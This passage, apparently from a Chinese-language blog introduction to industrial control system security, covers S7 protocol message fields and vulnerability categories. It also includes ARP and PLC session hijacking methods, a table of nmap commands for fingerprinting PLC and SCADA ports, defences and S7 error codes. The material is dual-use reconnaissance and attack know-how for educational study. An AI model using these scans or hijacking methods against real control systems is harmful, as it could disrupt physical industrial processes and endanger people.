种不同类型的功能块）</td><td style="text-align:center">1</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">Block number（请求的块编号）</td><td style="text-align:center">3</td><td style="text-align:center">5</td></tr><tr><td style="text-align:center"><a href="#请求下载的目标文件系统类型">Destination filesystem</a>（请求的目标文件系统）</td><td style="text-align:center">8</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length part（接下来的字段长度）</td><td style="text-align:center">18</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown char before load mem（加载 mem 之前的未知字符）</td><td style="text-align:center">19</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Length of load memory（装载长度）</td><td style="text-align:center">20</td><td style="text-align:center">6</td></tr><tr><td style="text-align:center">Length of MC7 code（MC7 代码长度）</td><td style="text-align:center">26</td><td style="text-align:center">6</td></tr></tbody></table><p>当 PDU 类型是 ACK_DATA，Parameter 部分仅有一个 Function 字段。</p><ul><li>0x1b（Download block）：下载块<ul><li>和 Request download 相比少了目标文件系统后面的部分。Parameter 内容仅有 Function 确认和 Function 状态，但是多出了 Data 结构，内容主要为数据长度、未知字节以及数据内容，数据内容的长度。</li></ul></li><li>0x1c（Download ended）：下载结束<ul><li>结构和 Download block 类似。Parameter 中只有一个 Function 确认。</li></ul></li><li>0x1d（Start upload）：开始上传<ul><li>和 Request download 的前部分结构一致。</li></ul></li></ul><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Function Status（功能状态，包含错误是否发生、是否使用另一个检索块/文件来请求）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown byte(s) in blockcontrol（blockcontrol 中的所有未知字节）</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">UploadID（上传文件会话的 ID）</td><td style="text-align:center">4</td><td style="text-align:center">4</td></tr><tr><td style="text-align:center">Blocklengthstring Length（块长字符串后的字节长度）</td><td style="text-align:center">8</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Blocklength（完整上传块的长度（以字节为单位），可以拆分为多个 PDU）</td><td style="text-align:center">9</td><td style="text-align:center">7</td></tr></tbody></table><ul><li>0x1e（Upload）：上传</li></ul><p>当 PDU 类型为 JOB 时，Upload 结构中没有 Data，Parameter 的结构如下（和 Start upload 类似）：</p><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Function Status（功能状态，包含错误是否发生、是否使用另一个检索块/文件来请求）</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown byte(s) in blockcontrol（blockcontrol 中的所有未知字节）</td><td style="text-align:center">2</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">UploadID（上传文件会话的 ID）</td><td style="text-align:center">4</td><td style="text-align:center">4</td></tr></tbody></table><ul><li>0x1f（End upload）：上传结束<ul><li>当 PDU 类型为 JOB 时，结构和 Upload 相同；</li><li>当 PDU 类型为 ACK_DATA 时，仅有一个功能确认的结构。</li></ul></li><li>0x28（PI-Service）：程序调用服务<ul><li>用于 PLC 修改执行/内存状态的日常工作。这些命令可以用于启动或停止 PLC 控制程序、激活或删除程序块。</li></ul></li></ul><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center">Start</th><th style="text-align:center">Length</th></tr></thead><tbody><tr><td style="text-align:center">Function（函数声明）</td><td style="text-align:center">0</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">Unknown bytes（未知字节）</td><td style="text-align:center">1</td><td style="text-align:center">7</td></tr><tr><td style="text-align:center">Parameter block length（参数块长度）</td><td style="text-align:center">8</td><td style="text-align:center">2</td></tr><tr><td style="text-align:center">String length（PI service 的字符串长度）</td><td style="text-align:center">12</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center"><a href="#程序调用服务名">PI (program invocation) Service</a>（程序调用服务名）</td><td style="text-align:center">13</td><td style="text-align:center">9</td></tr></tbody></table><ul><li>0x29（PLC Stop）：关闭 PLC<ul><li>机构和 PI-Service 一致。</li></ul></li></ul><h2 id="其他工控协议"><a href="#其他工控协议" class="headerlink" title="其他工控协议"></a>其他工控协议</h2><p>IEC 60870-5-104、EtherNet/IP、Tridium Niagara Fox、Crimson V3、OMRON FINS、PCWorx、ProConOs、MELSEC-Q 等。</p><h2 id="工控协议仿真资源"><a href="#工控协议仿真资源" class="headerlink" title="工控协议仿真资源"></a>工控协议仿真资源</h2><ul><li>Modbus 协议<ul><li>ModSim、ModScan、mod_RSsim</li></ul></li><li>西门子 S7 协议<ul><li>snap7 client、snap7 server</li></ul></li><li>IEC104 协议<ul><li>PMA 规约分析软件</li></ul></li><li>DNP3 协议<ul><li>opendnp3 Simulator</li></ul></li><li>IEC61850 协议<ul><li>Protocol Test Harness</li></ul></li><li>BACnet 协议<ul><li>BACnet Server</li></ul></li><li>OPC UA 和 OPC DA 协议<ul><li>KEPServerEX、UAEXpect</li></ul></li></ul><h1 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h1><p>除了上面讲的协议部分，其他还有很多方面存在漏洞。</p><h2 id="Code-Logic-Vulnerability-in-PLC"><a href="#Code-Logic-Vulnerability-in-PLC" class="headerlink" title="Code Logic Vulnerability in PLC"></a>Code Logic Vulnerability in PLC</h2><p>工控编程是工控系统运行的核心和重点：</p><ul><li>工控编程核心为明白工控业务逻辑，而工控编程遵循 IEC61131-3（工控史上首例实现 PLC、DCS、运动控制、 SCADA 等联合编程的标准——IEC61131-3），包括 5 种编程语言标准，3 种是图形化语言（梯形图、顺序功能图和功能块图），两种是文本化语言（指令表和结构文本）。</li><li>工控设备往往可以在线调试，从而可以控制某些输入输出端口，实现强制启停的功能，如果这些功能可以采用 Remote 方式重发，那攻击危害就更为严重。</li><li>工控设备的连接方式多样，一般采用串口，但是目前设备发展支持以太网、USB 接口等新的方式，如果网口不行试试串口、USB。</li><li>工控组态可以非常复杂，甚至连接成百上千个输入输出都有可能，组态中会由于添加了新的组件而更加麻烦，这时候要慢慢看，一点一点缕出来。</li></ul><h3 id="PLC-代码逻辑漏洞"><a href="#PLC-代码逻辑漏洞" class="headerlink" title="PLC 代码逻辑漏洞"></a>PLC 代码逻辑漏洞</h3><ul><li>计算逻辑漏洞</li><li>看门狗超时漏洞</li><li>缓冲区溢出漏洞</li></ul><h2 id="Communication-Hijack"><a href="#Communication-Hijack" class="headerlink" title="Communication Hijack"></a>Communication Hijack</h2><p>通信劫持是工控场景中最经典利用方式，例如 ARP 劫持、PLC/HMI 通信劫持、PLC 会话劫持、PLC 命令执行等内容。通信劫持的方法：</p><ul><li>ARP 劫持，ARP 劫持可以阻断 PLC 与其他设备的通信，鉴于工程会存在写死 IP 等交互地址，未必管用，但是值得一试；</li><li>PLC/HMI 通信劫持，采用旁路设备接入或控制 PLC 设备，对 IO 进行强制重写或输出；</li><li>PLC 命令执行，针对工控设备最敏感的部分是设备宕机（无法恢复的）、设备启停、设备强制更新参数，等等这些对普通工艺能够产生较大的影响。</li></ul><h3 id="工业以太网链路漏洞"><a href="#工业以太网链路漏洞" class="headerlink" title="工业以太网链路漏洞"></a>工业以太网链路漏洞</h3><ul><li>MAC 泛洪攻击</li><li>ARP 溢出/中间人攻击</li><li>环网 Beacon 协议攻击</li><li>VLAN 跳转攻击</li><li>交换机 WEB 漏洞攻击</li></ul><h2 id="Host-Security-Vulnerability"><a href="#Host-Security-Vulnerability" class="headerlink" title="Host Security Vulnerability"></a>Host Security Vulnerability</h2><p>主机上可能会自带的漏洞：</p><ul><li>防火墙关闭</li><li>没有杀毒软件防护</li><li>缺乏 USB 准入</li><li>Windows 本身的漏洞<ul><li>SMB v1.0 Port 445</li><li>RDP Port 3389</li><li>AD 域攻击</li><li>DNS 污染攻击</li></ul></li></ul><p><img src="/pics/工控安全基础概念初探/4.png" srcset="/img/loading.gif" alt></p><h2 id="Vulnerability-in-SCADA"><a href="#Vulnerability-in-SCADA" class="headerlink" title="Vulnerability in SCADA"></a>Vulnerability in SCADA</h2><ul><li>DoS 拒绝式服务攻击</li><li>缓冲区溢出漏洞</li><li>COM 服务组件未授权访问漏洞</li><li>SQL 数据库注入的漏洞</li></ul><h2 id="Physical-Security-Vulnerability"><a href="#Physical-Security-Vulnerability" class="headerlink" title="Physical Security Vulnerability"></a>Physical Security Vulnerability</h2><ul><li>设备所在地无防护</li><li>机房机柜未上锁</li><li>网络端口未加固</li><li>控制器钥匙未拔出</li><li>供电电源为单路</li><li>接地系统不完善</li></ul><h1 id="Firmware-Reversing"><a href="#Firmware-Reversing" class="headerlink" title="Firmware Reversing"></a>Firmware Reversing</h1><p>工具：</p><ul><li>Binwalk</li><li>BAT（Binary Analysis Toolkit）</li><li>…</li></ul><table><thead><tr><th style="text-align:center">Device</th><th style="text-align:center">Vendor</th><th style="text-align:center">OS</th><th style="text-align:center">Binwalk</th><th style="text-align:center">BAT</th></tr></thead><tbody><tr><td style="text-align:center">Camera</td><td style="text-align:center">STL</td><td style="text-align:center">Linux</td><td style="text-align:center">不支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">Router</td><td style="text-align:center">Bintec</td><td style="text-align:center">-</td><td style="text-align:center">不支持</td><td style="text-align:center">不支持</td></tr><tr><td style="text-align:center">ADSL Gateway</td><td style="text-align:center">Zyxel</td><td style="text-align:center">ZynOS</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">PLC</td><td style="text-align:center">Siemens</td><td style="text-align:center">-</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">DSLAM</td><td style="text-align:center">-</td><td style="text-align:center">-</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">PC</td><td style="text-align:center">Intel</td><td style="text-align:center">BIOS</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">ISDN Server</td><td style="text-align:center">Planet</td><td style="text-align:center">-</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">Voip</td><td style="text-align:center">Asotel</td><td style="text-align:center">Vxworks</td><td style="text-align:center">支持</td><td style="text-align:center">支持</td></tr><tr><td style="text-align:center">Modem</td><td style="text-align:center">-</td><td style="text-align:center">-</td><td style="text-align:center">不支持</td><td style="text-align:center">不支持</td></tr><tr><td style="text-align:center">Home Automation</td><td style="text-align:center">Belkin</td><td style="text-align:center">Linux</td><td style="text-align:center">不支持</td><td style="text-align:center">不支持</td></tr></tbody></table><h1 id="Discovering"><a href="#Discovering" class="headerlink" title="Discovering"></a>Discovering</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>使用 Shodan 几乎可以搜索到网络上所有的 PLC、SCADA 等设备。</p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>目前针对工控设备扫描中，在 Nmap、Metasploit、Censes 集成了大量的工具，用于挖掘当前在线 PLC、DCS 等 ICS 设备。</p><h3 id="基于端口"><a href="#基于端口" class="headerlink" title="基于端口"></a>基于端口</h3><table><thead><tr><th style="text-align:center">端口</th><th style="text-align:center">协议 / 设备</th><th style="text-align:center">来源</th></tr></thead><tbody><tr><td style="text-align:center">102（TCP）</td><td style="text-align:center">Siemens S7</td><td style="text-align:center"><code>nmap --script s7-info.nse -p 102 [HOST]</code> \ <code>nmap -sP --script s71200-enumerate-old.nse -p 102 [HOST]</code></td></tr><tr><td style="text-align:center">502（TCP）</td><td style="text-align:center">Modbus</td><td style="text-align:center"><code>nmap --script modicon-info -p 502 [HOST]</code></td></tr><tr><td style="text-align:center">2404（TCP）</td><td style="text-align:center">IEC 60870-5-104</td><td style="text-align:center"><code>nmap -Pn -n -d --script iec-identify.nse --script-args=&#39;iec-identify.timeout=500&#39; -p 2404 [HOST]</code></td></tr><tr><td style="text-align:center">20000（TCP）</td><td style="text-align:center">DNP3</td><td style="text-align:center"><code>nmap -sT --script dnp3-enumerate.nse -p 20000 [HOST]</code> / <code>nmap --script dnp3-info -p 20000 [HOST]</code></td></tr><tr><td style="text-align:center">44818（TCP）</td><td style="text-align:center">Ethernet/IP</td><td style="text-align:center"><code>nmap --script enip-enumerate -sU -p 44818 [HOST]</code></td></tr><tr><td style="text-align:center">47808（UDP）</td><td style="text-align:center">BACnet</td><td style="text-align:center"><code>nmap --script BACnet-discover-enumerate.nse -sU -p 47808 [HOST]</code></td></tr><tr><td style="text-align:center">1911（TCP）</td><td style="text-align:center">Tridium Nixagara Fo</td><td style="text-align:center"><code>nmap --script fox-info.nse -p 1911 [HOST]</code></td></tr><tr><td style="text-align:center">789（TCP）</td><td style="text-align:center">Crimson V3</td><td style="text-align:center"><code>nmap --script cr3-fingerprint.nse -p 789 [HOST]</code></td></tr><tr><td style="text-align:center">9600（TCP）</td><td style="text-align:center">OMRON FINS</td><td style="text-align:center"><code>nmap --script omrontcp-info -p 9600 [HOST]</code></td></tr><tr><td style="text-align:center">1962（TCP）</td><td style="text-align:center">PCWorx</td><td style="text-align:center"><code>nmap --script pcworx-info -p 1962 [HOST]</code></td></tr><tr><td style="text-align:center">20547（TCP）</td><td style="text-align:center">ProConOs</td><td style="text-align:center"><code>nmap --script proconos-info -p 20547</code></td></tr><tr><td style="text-align:center">5007（TCP）</td><td style="text-align:center">Melsec-Q</td><td style="text-align:center"><code>nmap --script melsecq-discover -sT -p 5007 [HOST]</code></td></tr><tr><td style="text-align:center">5006</td><td style="text-align:center">Melsec-Q</td><td style="text-align:center"><code>nmap --script melsecq-discover-udp.nse -sU -p 5006 [HOST]</code></td></tr><tr><td style="text-align:center">1200（TCP）</td><td style="text-align:center">Codesys</td><td style="text-align:center"><code>nmap --script codesys-v2-discover.nse [HOST]</code></td></tr><tr><td style="text-align:center">10001</td><td style="text-align:center">ATG</td><td style="text-align:center"><code>nmap --script atg-info -p 10001 [HOST]</code></td></tr></tbody></table><h3 id="基于组态软件的组件"><a href="#基于组态软件的组件" class="headerlink" title="基于组态软件的组件"></a>基于组态软件的组件</h3><table><thead><tr><th style="text-align:center">端口</th><th style="text-align:center">协议 / 设备</th><th style="text-align:center">连接方法</th></tr></thead><tbody><tr><td style="text-align:center">102（TCP）</td><td style="text-align:center">Siemens S7</td><td style="text-align:center">西门子软件 Step7 自带扫描当前网段 PLC 设备功能</td></tr><tr><td style="text-align:center">502（TCP）</td><td style="text-align:center">Modbus</td><td style="text-align:center">施耐德 SoMachine Basic 连接 PLC 设备自带扫描内网网段功能</td></tr></tbody></table><h1 id="Defence"><a href="#Defence" class="headerlink" title="Defence"></a>Defence</h1><p>工业控制系统安全防御：</p><ul><li>区域边界<ul><li>工业防火墙</li><li>区域防火墙</li><li>网闸</li></ul></li><li>网络安全<ul><li>交换机空余端口关闭</li><li>Native VLAN</li><li>禁用 CDP 或 LLDP</li><li>握手报文加密</li></ul></li><li>主机安全<ul><li>杀毒软件</li><li>防火墙</li><li>基线安全</li><li>USB 口准入</li><li>应用白名单</li></ul></li><li>控制器安全<ul><li>协议加密</li><li>准入控制</li><li>身份认证</li></ul></li><li>物理安全<ul><li>接地安全</li><li>双路供电</li><li>电柜上锁</li></ul></li></ul><h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><h2 id="错误码的含义"><a href="#错误码的含义" class="headerlink" title="错误码的含义"></a>错误码的含义</h2><table><thead><tr><th style="text-align:center">错误码</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">0x0000</td><td style="text-align:center">没有错误</td></tr><tr><td style="text-align:center">0x0110</td><td style="text-align:center">块号无效</td></tr><tr><td style="text-align:center">0x0111</td><td style="text-align:center">请求长度无效</td></tr><tr><td style="text-align:center">0x0112</td><td style="text-align:center">参数无效</td></tr><tr><td style="text-align:center">0x0113</td><td style="text-align:center">块类型无效</td></tr><tr><td style="text-align:center">0x0114</td><td style="text-align:center">找不到块</td></tr><tr><td style="text-align:center">0x0115</td><td style="text-align:center">块已存在</td></tr><tr><td style="text-align:center">0x0116</td><td style="text-align:center">块被写保护</td></tr><tr><td style="text-align:center">0x0117</td><td style="text-align:center">块/操作系统更新太大</td></tr><tr><td style="text-align:center">0x0118</td><td style="text-align:center">块号无效</td></tr><tr><td style="text-align:center">0x0119</td><td style="text-align:center">输入的密码不正确</td></tr><tr><td style="text-align:center">0x011A</td><td style="text-align:center">PG 资源错误</td></tr><tr><td style="text-align:center">0x011B</td><td style="text-align:center">PLC 资源错误</td></tr><tr><td style="text-align:center">0x011C</td><td style="text-align:center">协议错误</td></tr><tr><td style="text-align:center">0x011D</td><td style="text-align:center">块太多（与模块相关的限制）</td></tr><tr><td style="text-align:center">0x011E</td><td style="text-align:center">不再与数据库建立连接，或者 S7DOS 句柄无效</td></tr><tr><td style="text-align:center">0x011F</td><td style="text-align:center">结果缓冲区太小</td></tr><tr><td style="text-align:center">0x0120</td><td style="text-align:center">块结束列表</td></tr><tr><td style="text-align:center">0x0140</td><td style="text-align:center">可用内存不足</td></tr><tr><td style="text-align:center">0x0141</td><td style="text-align:center">由于缺少资源，无法处理作业</td></tr><tr><td style="text-align:center">0x8001</td><td style="text-align:center">当块处于当前状态时，无法执行请求的服务</td></tr><tr><td style="text-align:center">0x8003</td><td style="text-align:center">S7 协议错误：传输块时发生错误</td></tr><tr><td style="text-align:center">0x8100</td><td style="text-align:center">应用程序，一般错误：远程模块未知的服务</td></tr><tr><td style="text-align:center">0x8104</td><td style="text-align:center">未在模块上实现此服务或报告了帧错误</td></tr><tr><td style="text-align:center">0x8204</td><td style="text-align:center">对象的类型规范不一致</td></tr><tr><td style="text-align:center">0x8205</td><td style="text-align:center">复制的块已存在且未链接</td></tr><tr><td style="text-align:center">0x8301</td><td style="text-align:center">模块上的内存空间或工作内存不足，或者指定的存储介质不可访问</td></tr><tr><td style="text-align:center">0x8302</td><td style="text-align:center">可用资源太少或处理器资源不可用</td></tr><tr><td style="text-align:center">0x8304</td><td style="text-align:center">无法进一步并行上传。存在资源瓶颈</td></tr><tr><td style="text-align:center">0x8305</td><td style="text-align:center">功能不可用</td></tr><tr><td style="text-align:center">0x8306</td><td style="text-align:center">工作内存不足（用于复制，链接，加载 AWP）</td></tr><tr><td style="text-align:center">0x8307</td><td style="text-align:center">保持性工作记忆不够（用于复制，链接，加载 AWP）</td></tr><tr><td style="text-align:center">0x8401</td><td style="text-align:center">S7 协议错误：无效的服务序列（例如，加载或上载块）</td></tr><tr><td style="text-align:center">0x8402</td><td style="text-align:center">由于寻址对象的状态，服务无法执行</td></tr><tr><td style="text-align:center">0x8404</td><td style="text-align:center">S7 协议：无法执行该功能</td></tr><tr><td style="text-align:center">0x8405</td><td style="text-align:center">远程块处于 DISABLE 状态（CFB）。该功能无法执行</td></tr><tr><td style="text-align:center">0x8500</td><td style="text-align:center">S7 协议错误：帧错误</td></tr><tr><td style="text-align:center">0x8503</td><td style="text-align:center">来自模块的警报：服务过早取消</td></tr><tr><td style="text-align:center">0x8701</td><td style="text-align:center">寻址通信伙伴上的对象时出错（例如，区域长度错误）</td></tr><tr><td style="text-align:center">0x8702</td><td style="text-align:center">模块不支持所请求的服务</td></tr><tr><td style="text-align:center">0x8703</td><td style="text-align:center">拒绝访问对象</td></tr><tr><td style="text-align:center">0x8704</td><td style="text-align:center">访问错误：对象已损坏</td></tr><tr><td style="text-align:center">0xD001</td><td style="text-align:center">协议错误：非法的作业号</td></tr><tr><td style="text-align:center">0xD002</td><td style="text-align:center">参数错误：非法的作业变体</td></tr><tr><td style="text-align:center">0xD003</td><td style="text-align:center">参数错误：模块不支持调试功能</td></tr><tr><td style="text-align:center">0xD004</td><td style="text-align:center">参数错误：作业状态非法</td></tr><tr><td style="text-align:center">0xD005</td><td style="text-align:center">参数错误：作业终止非法</td></tr><tr><td style="text-align:center">0xD006</td><td style="text-align:center">参数错误：非法链路断开 ID</td></tr><tr><td style="text-align:center">0xD007</td><td style="text-align:center">参数错误：缓冲区元素数量非法</td></tr><tr><td style="text-align:center">0xD008</td><td style="text-align:center">参数错误：扫描速率非法</td></tr><tr><td style="text-align:center">0xD009</td><td style="text-align:center">参数错误：执行次数非法</td></tr><tr><td style="text-align:center">0xD00A</td><td style="text-align:center">参数错误：非法触发事件</td></tr><tr><td style="text-align:center">0xD00B</td><td style="text-align:center">参数错误：非法触发条件</td></tr><tr><td style="text-align:center">0xD011</td><td style="text-align:center">调用环境路径中的参数错误：块不存在</td></tr><tr><td style="text-align:center">0xD012</td><td style="text-align:center">参数错误：块中的地址错误</td></tr><tr><td style="text-align:center">0xD014</td><td style="text-align:center">参数错误：正在删除/覆盖块</td></tr><tr><td style="text-align:center">0xD015</td><td style="text-align:center">参数错误：标签地址非法</td></tr><tr><td style="text-align:center">0xD016</td><td style="text-align:center">参数错误：由于用户程序错误，无法测试作业</td></tr><tr><td style="text-align:center">0xD017</td><td style="text-align:center">参数错误：非法触发号</td></tr><tr><td style="text-align:center">0xD025</td><td style="text-align:center">参数错误：路径无效</td></tr><tr><td style="text-align:center">0xD026</td><td style="text-align:center">参数错误：非法访问类型</td></tr><tr><td style="text-align:center">0xD027</td><td style="text-align:center">参数错误：不允许此数据块数</td></tr><tr><td style="text-align:center">0xD031</td><td style="text-align:center">内部协议错误</td></tr><tr><td style="text-align:center">0xD032</td><td style="text-align:center">参数错误：结果缓冲区长度错误</td></tr><tr><td style="text-align:center">0xD033</td><td style="text-align:center">协议错误：作业长度错误</td></tr><tr><td style="text-align:center">0xD03F</td><td style="text-align:center">编码错误：参数部分出错（例如，保留字节不等于 0）</td></tr><tr><td style="text-align:center">0xD041</td><td style="text-align:center">数据错误：非法状态列表 ID</td></tr><tr><td style="text-align:center">0xD042</td><td style="text-align:center">数据错误：标签地址非法</td></tr><tr><td style="text-align:center">0xD043</td><td style="text-align:center">数据错误：找不到引用的作业，检查作业数据</td></tr><tr><td style="text-align:center">0xD044</td><td style="text-align:center">数据错误：标签值非法，检查作业数据</td></tr><tr><td style="text-align:center">0xD045</td><td style="text-align:center">数据错误：HOLD 中不允许退出 ODIS 控制</td></tr><tr><td style="text-align:center">0xD046</td><td style="text-align:center">数据错误：运行时测量期间非法测量阶段</td></tr><tr><td style="text-align:center">0xD047</td><td style="text-align:center">数据错误：“读取作业列表”中的非法层次结构</td></tr><tr><td style="text-align:center">0xD048</td><td style="text-align:center">数据错误：“删除作业”中的非法删除 ID</td></tr><tr><td style="text-align:center">0xD049</td><td style="text-align:center">“替换作业”中的替换 ID 无效</td></tr><tr><td style="text-align:center">0xD04A</td><td style="text-align:center">执行’程序状态’时出错</td></tr><tr><td style="text-align:center">0xD05F</td><td style="text-align:center">编码错误：数据部分出错（例如，保留字节不等于 0，…）</td></tr><tr><td style="text-align:center">0xD061</td><td style="text-align:center">资源错误：没有作业的内存空间</td></tr><tr><td style="text-align:center">0xD062</td><td style="text-align:center">资源错误：作业列表已满</td></tr><tr><td style="text-align:center">0xD063</td><td style="text-align:center">资源错误：触发事件占用</td></tr><tr><td style="text-align:center">0xD064</td><td style="text-align:center">资源错误：没有足够的内存空间用于一个结果缓冲区元素</td></tr><tr><td style="text-align:center">0xD065</td><td style="text-align:center">资源错误：没有足够的内存空间用于多个结果缓冲区元素</td></tr><tr><td style="text-align:center">0xD066</td><td style="text-align:center">资源错误：可用于运行时测量的计时器被另一个作业占用</td></tr><tr><td style="text-align:center">0xD067</td><td style="text-align:center">资源错误：“修改标记”作业过多（特别是多处理器操作）</td></tr><tr><td style="text-align:center">0xD081</td><td style="text-align:center">当前模式下不允许使用的功能</td></tr><tr><td style="text-align:center">0xD082</td><td style="text-align:center">模式错误：无法退出 HOLD 模式</td></tr><tr><td style="text-align:center">0xD0A1</td><td style="text-align:center">当前保护级别不允许使用的功能</td></tr><tr><td style="text-align:center">0xD0A2</td><td style="text-align:center">目前无法运行，因为正在运行的函数会修改内存</td></tr><tr><td style="text-align:center">0xD0A3</td><td style="text-align:center">I / O 上活动的“修改标记”作业太多（特别是多处理器操作）</td></tr><tr><td style="text-align:center">0xD0A4</td><td style="text-align:center">‘强制’已经建立</td></tr><tr><td style="text-align:center">0xD0A5</td><td style="text-align:center">找不到引用的作业</td></tr><tr><td style="text-align:center">0xD0A6</td><td style="text-align:center">无法禁用/启用作业</td></tr><tr><td style="text-align:center">0xD0A7</td><td style="text-align:center">无法删除作业，例如因为当前正在读取作业</td></tr><tr><td style="text-align:center">0xD0A8</td><td style="text-align:center">无法替换作业，例如因为当前正在读取或删除作业</td></tr><tr><td style="text-align:center">0xD0A9</td><td style="text-align:center">无法读取作业，例如因为当前正在删除作业</td></tr><tr><td style="text-align:center">0xD0AA</td><td style="text-align:center">处理操作超出时间限制</td></tr><tr><td style="text-align:center">0xD0AB</td><td style="text-align:center">进程操作中的作业参数无效</td></tr><tr><td style="text-align:center">0xD0AC</td><td style="text-align:center">进程操作中的作业数据无效</td></tr><tr><td style="text-align:center">0xD0AD</td><td style="text-align:center">已设置操作模式</td></tr><tr><td style="text-align:center">0xD0AE</td><td style="text-align:center">作业是通过不同的连接设置的，只能通过此连接进行处理</td></tr><tr><td style="text-align:center">0xD0C1</td><td style="text-align:center">访问标签时至少检测到一个错误</td></tr><tr><td style="text-align:center">0xD0C2</td><td style="text-align:center">切换到 STOP / HOLD 模式</td></tr><tr><td style="text-align:center">0xD0C3</td><td style="text-align:center">访问标记时至少检测到一个错误。模式更改为 STOP / HOLD</td></tr><tr><td style="text-align:center">0xD0C4</td><td style="text-align:center">运行时测量期间超时</td></tr><tr><td style="text-align:center">0xD0C5</td><td style="text-align:center">块堆栈的显示不一致，因为块被删除/重新加载</td></tr><tr><td style="text-align:center">0xD0C6</td><td style="text-align:center">作业已被删除，因为它所引用的作业已被删除</td></tr><tr><td style="text-align:center">0xD0C7</td><td style="text-align:center">由于退出了 STOP 模式，因此作业被自动删除</td></tr><tr><td style="text-align:center">0xD0C8</td><td style="text-align:center">由于测试作业和正在运行的程序之间不一致，“块状态”中止</td></tr><tr><td style="text-align:center">0xD0C9</td><td style="text-align:center">通过复位 OB90 退出状态区域</td></tr><tr><td style="text-align:center">0xD0CA</td><td style="text-align:center">通过在退出前重置 OB90 并访问错误读取标签退出状态范围</td></tr><tr><td style="text-align:center">0xD0CB</td><td style="text-align:center">外设输出的输出禁用再次激活</td></tr><tr><td style="text-align:center">0xD0CC</td><td style="text-align:center">调试功能的数据量受时间限制</td></tr><tr><td style="text-align:center">0xD201</td><td style="text-align:center">块名称中的语法错误</td></tr><tr><td style="text-align:center">0xD202</td><td style="text-align:center">函数参数中的语法错误</td></tr><tr><td style="text-align:center">0xD205</td><td style="text-align:center">RAM 中已存在链接块：无法进行条件复制</td></tr><tr><td style="text-align:center">0xD206</td><td style="text-align:center">EPROM 中已存在链接块：无法进行条件复制</td></tr><tr><td style="text-align:center">0xD208</td><td style="text-align:center">超出模块的最大复制（未链接）块数</td></tr><tr><td style="text-align:center">0xD209</td><td style="text-align:center">（至少）模块上找不到给定块之一</td></tr><tr><td style="text-align:center">0xD20A</td><td style="text-align:center">超出了可以与一个作业链接的最大块数</td></tr><tr><td style="text-align:center">0xD20B</td><td style="text-align:center">超出了一个作业可以删除的最大块数</td></tr><tr><td style="text-align:center">0xD20C</td><td style="text-align:center">OB 无法复制，因为关联的优先级不存在</td></tr><tr><td style="text-align:center">0xD20D</td><td style="text-align:center">SDB 无法解释（例如，未知数）</td></tr><tr><td style="text-align:center">0xD20E</td><td style="text-align:center">没有（进一步）阻止可用</td></tr><tr><td style="text-align:center">0xD20F</td><td style="text-align:center">超出模块特定的最大块大小</td></tr><tr><td style="text-align:center">0xD210</td><td style="text-align:center">块号无效</td></tr><tr><td style="text-align:center">0xD212</td><td style="text-align:center">标头属性不正确（与运行时相关）</td></tr><tr><td style="text-align:center">0xD213</td><td style="text-align:center">SDB 太多。请注意对正在使用的模块的限制</td></tr><tr><td style="text-align:center">0xD216</td><td style="text-align:center">无效的用户程序 - 重置模块</td></tr><tr><td style="text-align:center">0xD217</td><td style="text-align:center">不允许在模块属性中指定的保护级别</td></tr><tr><td style="text-align:center">0xD218</td><td style="text-align:center">属性不正确（主动/被动）</td></tr><tr><td style="text-align:center">0xD219</td><td style="text-align:center">块长度不正确（例如，第一部分或整个块的长度不正确）</td></tr><tr><td style="text-align:center">0xD21A</td><td style="text-align:center">本地数据长度不正确或写保护错误</td></tr><tr><td style="text-align:center">0xD21B</td><td style="text-align:center">模块无法压缩或压缩早期中断</td></tr><tr><td style="text-align:center">0xD21D</td><td style="text-align:center">传输的动态项目数据量是非法的</td></tr><tr><td style="text-align:center">0xD21E</td><td style="text-align:center">无法为模块（例如 FM，CP）分配参数。系统数据无法链接</td></tr><tr><td style="text-align:center">0xD220</td><td style="text-align:center">编程语言无效。请注意对正在使用的模块的限制</td></tr><tr><td style="text-align:center">0xD221</td><td style="text-align:center">连接或路由的系统数据无效</td></tr><tr><td style="text-align:center">0xD222</td><td style="text-align:center">全局数据定义的系统数据包含无效参数</td></tr><tr><td style="text-align:center">0xD223</td><td style="text-align:center">通信功能块的实例数据块错误或超出最大背景数据块数</td></tr><tr><td style="text-align:center">0xD224</td><td style="text-align:center">SCAN 系统数据块包含无效参数</td></tr><tr><td style="text-align:center">0xD225</td><td style="text-align:center">DP 系统数据块包含无效参数</td></tr><tr><td style="text-align:center">0xD226</td><td 